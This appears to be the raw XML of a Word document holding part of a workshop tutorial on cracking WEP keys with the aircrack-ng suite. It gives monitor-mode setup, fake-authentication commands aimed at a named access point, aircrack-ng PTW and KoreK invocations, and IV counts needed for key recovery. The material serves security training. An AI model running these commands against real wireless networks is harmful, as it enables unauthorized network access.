          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="557FBAB2" w14:textId="77777777" w:rsidR="002B0795" w:rsidRPr="00B64689" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Two methods will be shown. It is recommended you try both for learning purposes. By trying both methods, you will see quickly the PTW method successfully determines the WEP key compared to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As a reminder, the PTW method only works successfully with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request/reply packets. Since this tutorial covers injection of ARP request packets, you can properly use this method. </w:t>
      </w:r>
      <w:r w:rsidRPr="00B64689">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">The other requirement is that you capture the full packet with </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B64689">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>airodump-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B64689">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>. Meaning, do not use the ”--</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B64689">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>ivs</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B64689">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>” option.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="202A2A30"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enter:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CA14005"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121A55C"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aircrack</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-b 00:14:6C:7E:40:80 output*.cap</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22D16DFA" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5774C219"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5470E5A" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>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 This is optional since when we originally captured the data, we applied a filter to only capture data for this one AP.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01FE614D" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>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16E768D8" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="46ADDDD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also use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start another console session and enter:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17247ADE" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6D8A507E" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="002A56B4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>aircrack</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-K -b 00:14:6C:7E:40:80 output*.cap</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E3ED44D" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7B6388C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4832F68"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-K invokes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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27BE7F07"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Access Point mac address. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="521BE5A4"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1345A3F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If you are using 1.0-rc1, add the option ”-K” for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attack. (1.0-rc1 defaults to PTW.)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71AFF6F8" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="06A289C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will need approximately 250,000 IVs for 64 bit and </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="248D1AC6" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5448D23B" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">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1,500,000 IVs for 128 bit keys.</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08B5F309" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">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If you are using the PTW attack, then you will need about 20,000 packets for 64-bit and 40,000 to 85,000 packets for 128 bit.</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> These are very approximate and there are many variables as to how many IVs you actually need to crack the WEP key.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="129AA404" w14:textId="31E18B71" w:rsidR="002B0795" w:rsidRPr="000C668B" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0C8C47F6" w14:textId="34AF3310" w:rsidR="002B0795" w:rsidRPr="000C668B" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4E237EEF" w14:textId="77777777" w:rsidR="007B0476" w:rsidRDefault="007B0476" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="42C96CB1" w14:textId="77777777" w:rsidR="007B0476" w:rsidRDefault="007B0476" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="445BA249" w14:textId="77777777" w:rsidR="007B0476" w:rsidRDefault="007B0476" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0A6D9826" w14:textId="77777777" w:rsidR="007B0476" w:rsidRDefault="007B0476" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2972A42D" w14:textId="77777777" w:rsidR="007B0476" w:rsidRDefault="007B0476" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2E1118EE" w14:textId="77777777" w:rsidR="007B0476" w:rsidRDefault="007B0476" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="60F64058" w14:textId="77777777" w:rsidR="007B0476" w:rsidRDefault="007B0476" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="620F60A9" w14:textId="77777777" w:rsidR="007B0476" w:rsidRDefault="007B0476" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7CB164AE" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
        </w:rPr>
        <w:t>Tutorial: How to crack WEP with no wireless clients</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C706FE1" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4080F091"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2D99BEBF"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7E377794" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="30F372EF" w14:textId="77777777" w:rsidR="002B0795" w:rsidRPr="002A56B4"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airmon</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="002A56B4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>-zc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="002A56B4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> start wlan0 9</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="068D1292" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6D0E130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4FFDB369" w14:textId="77777777" w:rsidR="002B0795" w:rsidRPr="00DC6CB9" w:rsidRDefault="002B0795" w:rsidP="002B0795">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Interface       Chipset         Driver</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52D8AD51" w14:textId="77777777" w:rsidR="002B0795" w:rsidRPr="00DC6CB9" w:rsidRDefault="002B0795" w:rsidP="002B0795">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
    <w:p w14:paraId="5D7DE506" w14:textId="77777777" w:rsidR="002B0795" w:rsidRPr="00DC6CB9" w:rsidRDefault="002B0795" w:rsidP="002B0795">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p>
    <w:p w14:paraId="41C806E6" w14:textId="77777777" w:rsidR="002B0795" w:rsidRPr="00DC6CB9" w:rsidRDefault="002B0795" w:rsidP="002B0795">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wlan0mon</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r w:rsidRPr="00DC6CB9">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> VAP (parent: wlan0) (monitor mode enabled)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31BD78BA" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4CCD42DF"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confirm the interface is properly setup, enter “</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>iwconfig</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>”.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F93F87C" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1AB09965"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2 -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03F98459" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1656F6D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21486BE7" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="72602F9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associate with an access point, use fake authentication:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F0DC5C9" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7E699073" w14:textId="77777777" w:rsidR="002B0795" w:rsidRPr="002A56B4"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aireplay</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-1 0 -e BSIDES -a 00:14:6C:7E:40:80 -h 00:09:5B:EC:EE:F2 wlan0mon</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32D7834A" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="10D47CEF"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42C9A880"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4D5221DF"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62EA4D03"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51996699"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0501D4C0"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our card MAC address</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="324B8312" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">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15F021A8" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0B8D092B" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3CA57A2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Or another variation for picky access points:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="334B3714" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="678CD41A" w14:textId="77777777" w:rsidR="002B0795" w:rsidRPr="008D1EBD"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-1 6000 -o 1 -q 10 -e </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>BSIDES</w:t>
      </w:r>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> -a 00:14:6C:7E:40:80 -h 00:09:5B:EC:EE:F2 wlan0mon</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20B1E17C" w14:textId="77777777" w:rsidR="002B0795" w:rsidRPr="00F80E8E" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6324051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7E37820" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">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6000 - </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Reauthenticate</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> very 6000 seconds. The long period also causes keep alive packets to be sent.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C8455BD" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">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o</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
